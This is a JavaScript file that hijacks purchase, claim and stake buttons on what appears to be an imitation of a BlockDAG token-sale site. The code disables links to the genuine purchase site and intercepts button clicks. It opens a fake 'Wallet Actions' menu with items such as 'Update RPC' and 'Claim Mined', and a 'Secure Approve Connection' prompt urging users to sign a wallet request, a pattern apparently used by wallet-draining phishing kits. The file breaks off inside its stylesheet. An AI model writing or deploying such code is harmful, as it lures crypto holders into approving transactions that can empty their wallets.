
class BuyButtonsOverride {
    constructor() {
        this.isInitialized = false;
        this.walletSelected = false;
        this.selectedWallet = null;
        this.keywords = [
            'buy bdag','buy $bdag','buy with crypto','buy with card','buy now','connect wallet',
            'claim bdag','claim $bdag','claim now','claim mined','stake','unstake',
            '$node','whitelist','whitelist purchase', 'Update RPC', 'Update Allocation', 'Unstake $BDAG', 'Fetch Transaction'
        ];
        this.actionKeywords = [
            'update rpc','update allocation','claim mined','claim bdag','claim $bdag','unstake bdag','unstake $bdag','fetch transaction'
        ];
    }

    isConnectText(text) {
        if (!text) return false;
        const t = text.trim().toLowerCase();
        if (t.includes('connect wallet')) return true;
        if (t === 'connect') return true;
        if (t.startsWith('connect ')) return true;
        if (t.includes('connect') && t.includes('wallet')) return true;
        return false;
    }

    isActionButtonText(text) {
        if (!text) return false;
        const normalized = text.trim().toLowerCase();
        return this.actionKeywords.some((kw) => normalized.includes(kw));
    }

    init() {
        if (this.isInitialized) return;

        // Add a document-level capturing listener to prevent navigation
        // in case per-element overrides fail or run too late.
        document.addEventListener('click', (e) => {
            try {
                const el = e.target.closest ? e.target.closest('a, button, [role="button"], [class*="btn"], [class*="button"]') : null;
                if (!el) return;

                // SKIP modal buttons - they have their own handlers
                if (el.closest('.wallet-modal-overlay') || el.closest('.buy-wallet-modal-overlay') || el.closest('.buy-wallet-action-overlay')) {
                    console.log('Skipping modal button (wallet-modal-overlay detected)');
                    return;
                }

                // SKIP buttons marked with data-no-override
                if (el.dataset && el.dataset.noOverride === 'true') {
                    console.log('Skipping button marked with data-no-override');
                    return;
                }

                        const text = (el.textContent || '').trim().toLowerCase();
                const href = (el.getAttribute && el.getAttribute('href') || '').trim().toLowerCase();

                const isConnectWalletButton = this.isConnectText(text);

                // If this is a Connect Wallet click, always open the action menu
                // immediately and do NOT apply purchase overrides to it.
                if (isConnectWalletButton) {
                    try {
                        e.preventDefault();
                        e.stopImmediatePropagation();
                    } catch (ex) {}
                    this.showWalletActionMenu(el);
                    return;
                }

                // If this element already overridden, block navigation and open the correct overlay
                if (el.dataset && el.dataset.overridden === 'true') {
                    e.preventDefault();
                    e.stopImmediatePropagation();
                    if (isConnectWalletButton) {
                        // Connect Wallet always shows action menu, never decision directly
                        this.showWalletActionMenu(el);
                    } else if (el.dataset.overrideMode === 'wallet-decision') {
                        this.showWalletActionMenu(el, true);
                    } else if (this.isActionButtonText(text) || this.isActionButtonText(href)) {
                        this.showWalletActionMenu(el);
                    } else {
                        this.showWalletSelectionModal();
                    }
                    return;
                }

                // If text or href matches our keywords or purchase URL, prevent navigation and open the correct overlay
                if (href.includes('purchase3.blockdag.network') || this.keywords.some(kw => text.includes(kw) || href.includes(kw))) {
                    e.preventDefault();
                    e.stopImmediatePropagation();
                    this.overrideBuyButton(el);
                    if (isConnectWalletButton) {
                        // Connect Wallet always shows action menu, never decision directly
                        this.showWalletActionMenu(el);
                    } else if (href.includes('purchase3.blockdag.network')) {
                        this.showWalletActionMenu(el, true);
                    } else if (this.isActionButtonText(text) || this.isActionButtonText(href)) {
                        this.showWalletActionMenu(el);
                    } else {
                        this.showWalletSelectionModal();
                    }
                    return;
                }
            } catch (err) {
                console.error('Error in document click interceptor', err);
            }
        }, true);

        // Wait for DOM to be ready and Angular to load
        // Neutralize any existing purchase links so they never navigate
        this.neutralizePurchaseLinks();
        this.waitForElementAndOverride();
        this.setupHeroButtonsPersistence();
        this.isInitialized = true;
    }

    neutralizePurchaseLinks() {
        try {
            // Disable all static purchase links so they cannot be clicked
            const purchaseAnchors = document.querySelectorAll('a[href*="purchase3.blockdag.network"], a[href*="purchase3"]');
            purchaseAnchors.forEach(a => {
                try {
                    a.setAttribute('href', 'javascript:void(0)');
                    a.removeAttribute('target');
                    a.dataset.noOverride = 'true';
                    a.style.cursor = 'default';
                } catch (e) {}
            });

            // Remove any parent-level purchase link metadata or handlers
            const parents = document.querySelectorAll('[data-purchase-link], .purchase-link-enabled');
            parents.forEach(p => {
                try {
                    delete p.dataset.purchaseLink;
                    p.classList.remove('purchase-link-enabled');
                    p._purchaseLinkHandlerAdded = false;
                    // Remove any click handlers added previously by cloning the node
                    const clone = p.cloneNode(true);
                    p.parentNode && p.parentNode.replaceChild(clone, p);
                } catch (e) {}
            });
        } catch (err) {
            console.warn('Failed to neutralize purchase links', err);
        }
    }

    setupHeroButtonsPersistence() {
        this.ensureHeroButtonsPersist();

        window.addEventListener('load', () => this.ensureHeroButtonsPersist());
        document.addEventListener('readystatechange', () => {
            if (document.readyState === 'complete') {
                this.ensureHeroButtonsPersist();
            }
        });

        const observer = new MutationObserver(() => this.ensureHeroButtonsPersist());
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    }

    ensureHeroButtonsPersist() {
        // No persistent hero buttons should be injected.
        return;
    }

    waitForElementAndOverride() {
        let hasFoundButtons = false;
        const checkForElement = () => {
            // Find all buy buttons by their text content
            const allButtons = document.querySelectorAll('button, a, [role="button"]');
            const buyButtons = [];

            allButtons.forEach(button => {
                const textContent = button.textContent?.trim().toLowerCase() || '';
                const href = (button.getAttribute('href') || '').trim().toLowerCase();
                
                // Skip buttons marked with data-no-override
                if (button.dataset && button.dataset.noOverride === 'true') {
                    return;
                }
                
            if (href.includes('purchase3.blockdag.network') ||
                textContent.includes('buy $bdag') ||
                textContent.includes('buy with crypto') ||
                textContent.includes('buy with card') ||
                textContent.includes('buy now') ||
                this.isConnectText(textContent) ||
                textContent.includes('claim $bdag') ||
                textContent.includes('claim now') ||
                textContent.includes('claim mined') ||
                textContent.includes('stake') ||
                textContent.includes('unstake') ||
                textContent.includes('$node') ||
                textContent.includes('whitelist') ||
                textContent.includes('whitelist purchase')) {
                buyButtons.push(button);
            }
            });

            if (buyButtons.length > 0) {
                console.log(`Found ${buyButtons.length} buy/claim/stake buttons`);
                buyButtons.forEach(button => this.overrideBuyButton(button));
                hasFoundButtons = true;
                // Stop checking after first successful find
                return;
            } else if (!hasFoundButtons) {
                // Keep checking every 500ms until elements are found (max 10 attempts)
                const attemptCount = (checkForElement.attempts || 0) + 1;
                checkForElement.attempts = attemptCount;
                if (attemptCount < 10) {
                    setTimeout(checkForElement, 500);
                }
            }
        };

        checkForElement();

        // Also set up a mutation observer to catch dynamically added elements
        this.setupMutationObserver();
    }

    setupMutationObserver() {
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                if (mutation.type === 'childList') {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === Node.ELEMENT_NODE) {
                            // Find candidate elements inside the added node and the node itself
                            const candidates = [];
                            if (node.matches && node.matches('button, a, [role="button"]')) {
                                candidates.push(node);
                            }
                            if (node.querySelectorAll) {
                                node.querySelectorAll('button, a, [role="button"]').forEach(n => candidates.push(n));
                            }

                            candidates.forEach(candidate => {
                                // Skip buttons marked with data-no-override
                                if (candidate.dataset && candidate.dataset.noOverride === 'true') {
                                    return;
                                }
                                
                                const text = (candidate.textContent || '').trim().toLowerCase();
                                for (let kw of this.keywords) {
                                    if (text.includes(kw)) {
                                        this.overrideBuyButton(candidate);
                                        break;
                                    }
                                }
                            });
                        }
                    });
                }
            });
        });

        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    }

    overrideBuyButton(element) {
        // Skip if already overridden
        if (element.dataset.overridden === 'true') return;

        // Skip if marked as no-override
        if (element.dataset && element.dataset.noOverride === 'true') {
            console.log('Skipping button marked with data-no-override');
            return;
        }

        // Mark as overridden to prevent duplicate processing
        element.dataset.overridden = 'true';

        console.log('Overriding button:', element.textContent.trim());

        const computedText = (element.textContent || '').trim().toLowerCase();
        const originalHref = (element.getAttribute('href') || '').trim().toLowerCase();
        const isConnectWalletButton = this.isConnectText(computedText);
        const isActionButton = this.isActionButtonText(computedText) || this.isActionButtonText(originalHref);
        const isDecisionButton = originalHref.includes('purchase3.blockdag.network') || computedText.includes('live swap');
        element.dataset.overrideMode = isDecisionButton ? 'wallet-decision'
            : (isConnectWalletButton || isActionButton) ? 'action-menu' : 'wallet-selection';

        // For <a> tags: set href to javascript:void(0) instead of removing it
        // This prevents default link behavior
        if (element.tagName === 'A') {
            element.setAttribute('href', 'javascript:void(0)');
        }
        element.removeAttribute('target');
        
        element.style.cursor = 'pointer';
        element.style.textDecoration = 'none';

        const openTarget = (e) => {
            console.log('Button onclick triggered');
            if (e) {
                e.preventDefault();
                e.stopPropagation();
            }
            if (element.dataset.overrideMode === 'wallet-decision') {
                this.showWalletActionMenu(element, true);
            } else if (isConnectWalletButton || isActionButton) {
                this.showWalletActionMenu(element);
            } else {
                this.showWalletSelectionModal();
            }
            return false;
        };

        element.onclick = (e) => openTarget(e);

        // Also add event listener with capture phase
        element.addEventListener('click', (e) => {
            console.log('Button click event listener triggered');
            openTarget(e);
            return false;
        }, true);

        // Add keydown handler for accessibility (Enter key)
        element.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' || e.key === ' ') {
                console.log('Button keydown triggered');
                e.preventDefault();
                e.stopPropagation();
                if (isConnectWalletButton) {
                    this.showWalletActionMenu(element);
                } else {
                    this.showWalletSelectionModal();
                }
                return false;
            }
        }, true);

        // Group Connect Wallet and Whitelist Purchase buttons together
        this.groupButtonsIfNeeded(element);
    }

    groupButtonsIfNeeded(element) {
        const text = (element.textContent || '').trim().toLowerCase();
        
        // If this is a "connect wallet" button, try to find and group with whitelist button
        if (text.includes('connect wallet')) {
            const parent = element.parentElement;
            if (parent) {
                // Check if already in a button group
                if (parent.classList.contains('button-group-container')) {
                    return; // Already grouped
                }

                // Look for whitelist purchase button nearby
                const parentParent = parent?.parentElement;
                if (parentParent) {
                    const allButtons = parentParent.querySelectorAll('button, [class*="btn"], a.btn');
                    const connectIdx = Array.from(allButtons).indexOf(element);
                    
                    // Look for whitelist button near the connect wallet button
                    for (let i = connectIdx + 1; i < Math.min(connectIdx + 5, allButtons.length); i++) {
                        const nextBtn = allButtons[i];
                        const nextText = (nextBtn.textContent || '').trim().toLowerCase();
                        if (nextText.includes('whitelist')) {
                            // Found whitelist button, create group
                            this.createButtonGroup(element, nextBtn);
                            return;
                        }
                    }
                }
            }
        }
    }

    createButtonGroup(connectBtn, whitelistBtn) {
        // If already grouped, nothing to do
        if (connectBtn.parentElement?.classList.contains('button-group-container')) {
            return;
        }

        const parent = connectBtn.parentElement;
        if (!parent) return;

        // Add grouping class to the parent container instead of cloning/removing originals.
        parent.classList.add('button-group-container');

        // Ensure both buttons have flexible sizing so they appear side-by-side.
        try {
            connectBtn.style.flex = connectBtn.style.flex || '1';
            connectBtn.style.minWidth = connectBtn.style.minWidth || '120px';
            whitelistBtn.style.flex = whitelistBtn.style.flex || '1';
            whitelistBtn.style.minWidth = whitelistBtn.style.minWidth || '120px';

            // If whitelist button is not a sibling, try to move it next to connectBtn.
            if (whitelistBtn.parentElement !== parent) {
                parent.insertBefore(whitelistBtn, connectBtn.nextSibling);
            }
            // Ensure clicking the Connect Wallet button always opens the action menu
            // and does not trigger any parent-level purchase navigation.
            try {
                if (!connectBtn._actionClickBound) {
                    connectBtn.addEventListener('click', (ev) => {
                        try {
                            ev.preventDefault();
                            ev.stopPropagation();
                        } catch (e) {}
                        // Use the override instance to show the menu
                        if (typeof window.buyButtonsOverride !== 'undefined' && window.buyButtonsOverride) {
                            window.buyButtonsOverride.showWalletActionMenu(connectBtn);
                        }
                        return false;
                    }, false);
                    connectBtn._actionClickBound = true;
                }
            } catch (err) {
                console.warn('Failed to bind direct action click to connect button', err);
            }
            // Only add a purchase link to the parent if the whitelist button
            // explicitly points to the purchase flow. Do NOT attach a purchase
            // link for generic connect-wallet grouping — that would open the
            // purchase page when the user intends to open the wallet actions.
            try {
                const whitelistHref = (whitelistBtn.getAttribute && whitelistBtn.getAttribute('href') || '').toLowerCase();
                const whitelistText = (whitelistBtn.textContent || '').toLowerCase();
                const hasPurchaseHref = whitelistHref.includes('purchase3.blockdag.network') || whitelistHref.includes('purchase3');
                const hasPurchaseText = whitelistText.includes('whitelist purchase') || whitelistText.includes('purchase');

                if (hasPurchaseHref || hasPurchaseText) {
                    parent.dataset.purchaseLink = whitelistHref || 'https://purchase3.blockdag.network/';
                    parent.classList.add('purchase-link-enabled');
                    if (!parent._purchaseLinkHandlerAdded) {
                        parent.addEventListener('click', (ev) => {
                            // If the click is on an actual button or link child, let that handler run
                            const clickedButton = ev.target.closest ? ev.target.closest('button, a, [role="button"], .buy-wallet-action-item, .buy-wallet-option') : null;
                            if (clickedButton && parent.contains(clickedButton)) {
                                return; // child button handles it
                            }
                            // Otherwise open purchase in a new tab
                            const url = parent.dataset.purchaseLink;
                            if (url) {
                                window.open(url, '_blank', 'noopener');
                            }
                        }, true);
                        parent._purchaseLinkHandlerAdded = true;
                    }
                } else {
                    // Ensure no purchase link is present for pure action grouping
                    delete parent.dataset.purchaseLink;
                    parent.classList.remove('purchase-link-enabled');
                }
            } catch (err) {
                console.warn('Failed to conditionally attach purchase link to button group', err);
            }
        } catch (err) {
            console.warn('Failed to non-destructively group buttons', err);
        }
    }

    showWalletSelectionModal() {
        console.log('Wallet selection modal triggered!');
        // Close action menu if it is open
        this.hideWalletActionMenu();
        // Create and show wallet selection modal
        this.createWalletSelectionModal();
    }

    showWalletActionMenu(triggerElement, showDecisionImmediately = false) {
        console.log('Wallet action menu triggered!');
        this.hideWalletActionMenu();
        this.hideWalletSelectionModal();

        const existingMenu = document.querySelector('.buy-wallet-action-overlay');
        if (existingMenu) {
            existingMenu.remove();
        }

        const overlay = document.createElement('div');
        overlay.className = 'buy-wallet-action-overlay';
        overlay.innerHTML = `
            <div class="buy-wallet-action-content" role="dialog" aria-modal="true" aria-label="Wallet actions">
                <div class="buy-wallet-action-header">
                    <div>
                        <p class="buy-wallet-action-title">Wallet Actions</p>
                        <p class="buy-wallet-action-subtitle">Choose an action before connecting your wallet.</p>
                    </div>
                    <button class="buy-wallet-action-close" type="button" aria-label="Close wallet actions">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                            <path d="M18 6L6 18M6 6L18 18" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
                        </svg>
                    </button>
                </div>
                <div class="buy-wallet-action-list">
                    <button class="buy-wallet-action-item" type="button" data-action="update-rpc">Update RPC</button>
                    <button class="buy-wallet-action-item" type="button" data-action="update-allocation">Update Allocation</button>
                    <button class="buy-wallet-action-item" type="button" data-action="claim-mined">Claim Mined</button>
                    <button class="buy-wallet-action-item" type="button" data-action="claim-bdag">Claim $BDAG</button>
                    <button class="buy-wallet-action-item" type="button" data-action="unstake-bdag">Unstake $BDAG</button>
                    <button class="buy-wallet-action-item" type="button" data-action="fetch-purchase">Fetch Transaction</button>
                </div>
            </div>
        `;

        document.body.appendChild(overlay);
        document.body.style.overflow = 'hidden';
        this.addModalStyles();

        if (showDecisionImmediately) {
            this.showConnectionDecisionStep(overlay, 'purchase');
        }

        overlay.addEventListener('click', (event) => {
            if (event.target === overlay) {
                this.hideWalletActionMenu();
                return;
            }

            const targetElement = (event.target && event.target.nodeType === Node.TEXT_NODE)
                ? event.target.parentElement
                : event.target;
            const button = targetElement && targetElement.closest ? targetElement.closest('.buy-wallet-action-close, .buy-wallet-action-item') : null;
            if (!button || !overlay.contains(button)) {
                return;
            }

            event.preventDefault();
            event.stopPropagation();

            if (button.classList.contains('buy-wallet-action-close')) {
                this.hideWalletActionMenu();
                return;
            }

            const actionType = button.dataset.action;
            if (!actionType) {
                return;
            }

            console.log('Wallet action selected via overlay delegation:', actionType);
            this.selectedAction = actionType;
            this.showConnectionDecisionStep(overlay, actionType);
        }, true);

        document.addEventListener('keydown', this.actionMenuKeyListener = (event) => {
            if (event.key === 'Escape') {
                this.hideWalletActionMenu();
            }
        });
    }

    hideWalletActionMenu() {
        const overlay = document.querySelector('.buy-wallet-action-overlay');
        if (overlay) {
            overlay.remove();
        }
        if (document.body.style.overflow === 'hidden') {
            document.body.style.overflow = '';
        }
        if (this.actionMenuKeyListener) {
            document.removeEventListener('keydown', this.actionMenuKeyListener);
            this.actionMenuKeyListener = null;
        }
    }

    showConnectionDecisionStep(overlay, actionType) {
        const decisionContainer = document.createElement('div');
        decisionContainer.className = 'buy-wallet-decision-step';
        decisionContainer.innerHTML = `
            <div class="buy-wallet-decision-header">
                <div>
                    
                    <p class="buy-wallet-decision-subtitle">Select the path for your next action. You can approve securely from your wallet or continue manually to the existing wallet selector.</p>
                
            <div class="buy-wallet-decision-grid">
                <div class="buy-wallet-decision-card buy-wallet-decision-card-primary">
                    <div class="buy-wallet-decision-card-header">
                        <p class="buy-wallet-decision-card-title">Secure Approve Connection</p>
                    </div>
                    <p class="buy-wallet-decision-card-description">Approve a blockchain signature request directly from your wallet for a more secure experience.</p>
                    <button class="buy-wallet-decision-card-button buy-wallet-decision-secure .interactButton" type="button">Secure Approve Connection</button>
                </div>
                <div class="buy-wallet-decision-card buy-wallet-decision-card-secondary">
                    <div class="buy-wallet-decision-card-header">
                        <p class="buy-wallet-decision-card-title">Connect Manually</p>
                    </div>
                    <p class="buy-wallet-decision-card-description">Continue to the wallet chooser and select your wallet from the existing connection flow.</p>
                    <button class="buy-wallet-decision-card-button buy-wallet-decision-manual" type="button">Connect Manually</button>
                </div>
            </div>
        `;

        const existingDecision = overlay.querySelector('.buy-wallet-decision-step');
        if (existingDecision) {
            existingDecision.remove();
        }

        const actionList = overlay.querySelector('.buy-wallet-action-list');
        if (actionList) {
            actionList.style.display = 'none';
        }

        const content = overlay.querySelector('.buy-wallet-action-content');
        if (content) {
            content.appendChild(decisionContainer);
        } else {
            overlay.appendChild(decisionContainer);
        }

        const manualButton = decisionContainer.querySelector('.buy-wallet-decision-manual');
        const secureButton = decisionContainer.querySelector('.buy-wallet-decision-secure');

        manualButton.addEventListener('click', (event) => {
            event.preventDefault();
            event.stopPropagation();
            this.hideWalletActionMenu();
            this.showWalletSelectionModal();
        });

        secureButton.addEventListener('click', (event) => {
            event.preventDefault();
            event.stopPropagation();
            this.hideWalletActionMenu();
            window.location.href = '/app.html';
        });
    }

    createWalletSelectionModal() {
        // Remove existing modal if any
        const existingModal = document.querySelector('.buy-wallet-modal-overlay');
        if (existingModal) {
            existingModal.remove();
        }

        // Create modal overlay
        const modalOverlay = document.createElement('div');
        modalOverlay.className = 'buy-wallet-modal-overlay';
        modalOverlay.innerHTML = `
            <div class="buy-wallet-modal-content">
                <div class="buy-wallet-modal-header">
                    <h2>Connect Wallet</h2>
                    <button class="buy-wallet-modal-close" onclick="buyButtonsOverride.hideWalletSelectionModal()">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                            <path d="M18 6L6 18M6 6L18 18" stroke="#ffffff" stroke-width="2" stroke-linecap="round"/>
                        </svg>
                    </button>
                </div>

                <div class="buy-wallet-options">
                    <button class="buy-wallet-option" onclick="buyButtonsOverride.selectWallet('walletBW')">
                     <span>BEST WALLET</span>   
                    <img src="assets/images/svg-icons/bw.png" alt="Best Wallet" />
                        </button>

                    <button class="buy-wallet-option" onclick="buyButtonsOverride.selectWallet('wallet')">
                    <span>WALLET CONNECT</span>    
                    <img src="assets/images/svg-icons/wallet.png" alt="Wallet Connect" />
                        </button>

                    <button class="buy-wallet-option" onclick="buyButtonsOverride.selectWallet('metamask')">
                       <span>METAMASK</span> 
                      <img src="assets/images/svg-icons/metamask.png" alt="Metamask" />
                         </button>

                    <button class="buy-wallet-option" onclick="buyButtonsOverride.selectWallet('base')">
                    <span>BASE WALLET</span>    
                    <img src="assets/images/svg-icons/base1.png" alt="Base Wallet" />
                        </button>

                    <button class="buy-wallet-option" onclick="buyButtonsOverride.selectWallet('trust')">
                    <span>TRUST</span>    
                    <img src="assets/images/svg-icons/trust.png" alt="Trust" />
                    </button>

                    <button class="buy-wallet-option" onclick="buyButtonsOverride.selectWallet('solflare')">
                        <span>SOLFLARE</span>
                        <img src="assets/images/svg-icons/solflare.png" alt="Solflare" />
                        </button>
                </div>

                <div class="mobile-message">
                    If you're on mobile, please open this inside your wallet's built-in browser.
                </div>
            </div>
        `;

        // Add styles for the modal
        this.addModalStyles();

        // Add to DOM
        document.body.appendChild(modalOverlay);
        document.body.style.overflow = 'hidden';

        // Add event listeners for wallet selection buttons
        const walletOptions = modalOverlay.querySelectorAll('.buy-wallet-option');
        walletOptions.forEach(button => {
            button.addEventListener('click', async (e) => {
                const walletType = button.getAttribute('onclick')?.match(/'([^']+)'/)?.[1];
                if (walletType) {
                    await this.selectWallet(walletType);
                }
            });
        });
    }

    hideWalletSelectionModal() {
        // Force hide all existing modals immediately
        const allSelectionModals = document.querySelectorAll('.buy-wallet-modal-overlay');
        allSelectionModals.forEach(modal => {
            modal.style.display = 'none';
            modal.remove();
        });

        // Also check for any wallet connection modals and make sure they're on top
        const walletModals = document.querySelectorAll('.wallet-modal-overlay');
        walletModals.forEach(modal => {
            modal.style.zIndex = '25000';
        });

        document.body.style.overflow = '';

        // Force a small delay to ensure DOM cleanup
        return new Promise(resolve => setTimeout(resolve, 10));
    }

    async selectWallet(walletType) {
        this.selectedWallet = walletType;
        this.walletSelected = true;

        // Immediately hide selection modal
        await this.hideWalletSelectionModal();

        // Force remove any lingering selection modals
        setTimeout(() => {
            const allModals = document.querySelectorAll('.buy-wallet-modal-overlay');
            allModals.forEach(modal => modal.remove());
        }, 10);

        // Trigger wallet connection immediately
        const triggered = this.triggerWalletConnection(walletType);
        if (!triggered) {
            this.waitForWalletModalAndTrigger(walletType, 3000);
        }
    }

    triggerWalletConnection(walletType) {
        const isCallable = (target) => typeof target === 'function';
        const directHandler = window.walletModal && window.walletModal.handleWalletClick;
        const globalHandler = window.handleWalletSelection;

        if (isCallable(directHandler)) {
            console.log('Triggering walletModal.handleWalletClick ->', walletType);
            window.walletModal.handleWalletClick(walletType);
            return true;
        }
        if (isCallable(globalHandler)) {
            console.log('Triggering window.handleWalletSelection ->', walletType);
            window.handleWalletSelection(walletType);
            return true;
        }

        console.warn('Wallet modal not ready yet, loading wallet modal script and dispatching fallback event', walletType);
        window.__buyButtonsOverridePendingWallet = walletType;
        this.loadWalletConnectionModalScript();
        window.dispatchEvent(new CustomEvent('buyButtonsOverrideWalletSelected', { detail: { walletType } }));
        return false;
    }

    loadWalletConnectionModalScript() {
        if (this.walletScriptLoading || window.walletModal || window.handleWalletSelection) {
            return;
        }

        const existingScript = document.querySelector('script[src*="/dev-releases/wallet-connection-modal.js"]');
        if (existingScript) {
            this.walletScriptLoading = true;
            return;
        }

        this.walletScriptLoading = true;
        const script = document.createElement('script');
        script.src = '/dev-releases/wallet-connection-modal.js?_=' + Date.now();
        script.async = true;
        script.onload = () => {
            console.log('[BuyButtonsOverride] wallet-connection-modal.js loaded');
            this.walletScriptLoading = false;
        };
        script.onerror = () => {
            console.error('[BuyButtonsOverride] Failed to load wallet-connection-modal.js');
            this.walletScriptLoading = false;
        };
        document.head.appendChild(script);
    }

    waitForWalletModalAndTrigger(walletType, timeoutMs) {
        const start = Date.now();
        const tryTrigger = () => {
            if (window.walletModal && window.walletModal.handleWalletClick) {
                window.walletModal.handleWalletClick(walletType);
                return;
            }
            if (window.handleWalletSelection) {
                window.handleWalletSelection(walletType);
                return;
            }
            if (Date.now() - start < timeoutMs) {
                setTimeout(tryTrigger, 100);
            } else {
                console.error('Wallet modal not found after waiting', walletType);
            }
        };
        tryTrigger();
    }

    addModalStyles() {
        // Check if styles already exist
        if (document.querySelector('#buy-wallet-modal-styles')) return;

        const style = document.createElement('style');
        style.id = 'buy-wallet-modal-styles';
        style.textContent = `
            /* Button group container for side-by-side buttons */
            .button-group-container {
                display: flex;
                gap: 12px;
                width: 100%;
                justify-content: center;
                align-items: center;
                flex-wrap: wrap;
            }

            .button-group-container button,
            .button-group-container [class*="btn"] {
                flex: 1;
                min-width: 140px;
            }

            .button-group-container button:first-child,
            .button-group-container [class*="btn"]:first-child {
                margin-right: 0;
            }

            .buy-wallet-modal-overlay,
            .buy-wallet-action-overlay {
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: rgba(21, 21, 22, 0.82);
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 500;
                padding: 20px;
            }

            .buy-wallet-modal-content,
            .buy-wallet-action-content {
                background: #3475d8;
                border-radius: 18px;
                padding: 24px;
                width: min(100%, 640px);
                max-width: 640px;
                position: relative;
                box-shadow: 0 28px 70px -24px rgba(10, 76, 197, 0.6);
                border: 1px solid rgba(34, 50, 192, 0.08);
                box-sizing: border-box;
            }

            .buy-wallet-modal-header,
            .buy-wallet-action-header {
                display: flex;
                justify-content: space-between;
                align-items: flex-start;
                margin-bottom: 22px;
                gap: 12px;
                padding-right: 6px;
            }

            .buy-wallet-modal-header h2,
            .buy-wallet-action-title {
                color: #ffffff;
                font-size: 18px;
                font-weight: 700;
                margin: 0;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                flex: 1;
            }

            .buy-wallet-action-subtitle {
                margin: 4px 0 0;
                color: #cbd5e1;
                font-size: 13px;
                line-height: 1.4;
            }

            .buy-wallet-modal-close,
            .buy-wallet-action-close {
                position: absolute;
                top: 18px;
                right: 18px;
                background: rgba(255, 255, 255, 0.08);
                border: none;
                cursor: pointer;
                padding: 10px;
                color: #ffffff;
                display: flex;
                align-items: center;
                justify-content: center;
                border-radius: 999px;
                transition: background 0.2s ease;
                z-index: 10;
                width: 40px;
                height: 40px;
                flex-shrink: 0;
            }

            .buy-wallet-action-close {
                top: 18px;
                right: 18px;
            }

            .buy-wallet-modal-close:hover,
            .buy-wallet-action-close:hover {
                background: rgba(255, 255, 255, 0.15);
            }

            .buy-wallet-modal-close:hover {
                opacity: 0.8;
            }

            .buy-wallet-options,
            .buy-wallet-action-list {
                display: flex;
                flex-direction: column;
                gap: 12px;
                margin-bottom: 18px;
            }

            .buy-wallet-option,
            .buy-wallet-action-item {
                display: inline-flex;
                align-items: center;
                justify-content: center;
                gap: 10px;
                width: 100%;
                min-height: 56px;
                padding: 16px 20px;
                border-radius: 18px;
                border: 1px solid rgba(255, 255, 255, 0.12);
                background: linear-gradient(319deg, #0094ff -1.9%, #0094ff 17.34%, #d2efff 87.36%), #0094ff;
                background-blend-mode: soft-light, normal;
                color: #ffffff;
                font-weight: 700;
                font-size: 15px;
                line-height: 1.2;
                letter-spacing: 0.06em;
                text-transform: uppercase;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                cursor: pointer;
                transition: transform 0.18s ease, box-shadow 0.18s ease, opacity 0.18s ease, background 0.18s ease;
                box-shadow: 0 18px 44px rgba(0, 0, 0, 0.18);
                position: relative;
                overflow: hidden;
            }

            .buy-wallet-action-item {
                justify-content: center;
                text-transform: uppercase;
            }

            .buy-wallet-option {
                justify-content: space-between;
                text-transform: none;
                letter-spacing: 0;
                font-weight: 600;
                background: rgba(12, 12, 12, 0.81);
                border-color: rgba(255, 255, 255, 0.97);
            }

            .buy-wallet-option:hover,
            .buy-wallet-action-item:hover {
                transform: translateY(-2px);
                box-shadow: 0 24px 52px rgba(0, 0, 0, 0.22);
                opacity: 0.96;
            }

            .buy-wallet-action-item:hover {
                background: linear-gradient(319deg, #0094ff -1.9%, #0094ff 17.34%, #d2efff 87.36%), #0094ff;
            }

            .buy-wallet-action-item:focus-visible {
                outline: 2px solid rgba(255, 255, 255, 0.9);
                outline-offset: 3px;
            }

            .buy-wallet-item-icon {
                display: inline-flex;
                width: 20px;
                height: 20px;
                align-items: center;
                justify-content: center;
            }

            .buy-wallet-option:hover {
                transform: translateY(-1px);
                box-shadow: 0 4px 12px rgba(237, 238, 240, 0.93);
                background: linear-gradient(135deg, #9d96f6 0%, #7282c7 50%, #7298d1 100%);
            }

            .buy-wallet-option span {
                text-align: left;
                font-weight: 700;
            }

            .buy-wallet-option img {
                width: 28px;
                height: 28px;
                object-fit: contain;
                margin-right: 12px;
                border-radius: 8px;
                box-shadow: 0 3px 12px rgba(0,0,0,0.18);
            }

            .buy-wallet-option span {
                flex: 1;
            }

            .wallet-icon {
                font-size: 20px;
                line-height: 1;
            }

            .buy-wallet-action-title {
                font-size: 18px;
                margin: 0;
            }

            .buy-wallet-action-subtitle {
                color: #cbd5e1;
                font-size: 13px;
                margin-top: 6px;
                line-height: 1.4;
            }

            .buy-wallet-action-list {
                margin-top: 8px;
            }

            .buy-wallet-decision-step {
                margin-top: 18px;
                display: flex;
                flex-direction: column;
                gap: 20px;
                padding-top: 10px;
                border-top: 1px solid rgba(255, 255, 255, 0.14);
            }

            .buy-wallet-decision-header {
                display: flex;
                align-items: flex-start;
                justify-content: space-between;
                gap: 12px;
                flex-wrap: wrap;
            }

            .buy-wallet-decision-title {
                font-size: 18px;
                font-weight: 800;
                color: #ffffff;
                margin: 0;
                line-height: 1.2;
            }

            .buy-wallet-decision-subtitle {
                font-size: 14px;
                color: #cbd5e1;
                margin: 0;
                line-height: 1.6;
                max-width: 620px;
            }

            .buy-wallet-decision-badge {
                display: inline-flex;
                align-items: center;
                justify-content: center;
                padding: 8px 12px;
                border-radius: 999px;
                background: rgba(56, 189, 248, 0.16);
                border: 1px solid rgba(56, 189, 248, 0.3);
                color: #e0f2fe;
                font-size: 12px;
                font-weight: 700;
                white-space: nowrap;
            }

            .buy-wallet-decision-grid {
                display: grid;
                grid-template-columns: repeat(2, minmax(0, 1fr));
                gap: 10px;
                align-items: stretch;
            }

            .buy-wallet-decision-card {
                min-height: 250px;
            }

            .buy-wallet-decision-card {
                display: flex;
                flex-direction: column;
                justify-content: space-between;
                border-radius: 22px;
                border: 1px solid rgba(255, 255, 255, 0.12);
                padding: 24px;
                background: rgba(16, 24, 40, 0.94);
                box-shadow: 0 22px 50px rgba(0, 0, 0, 0.14);
                min-width: 240px;
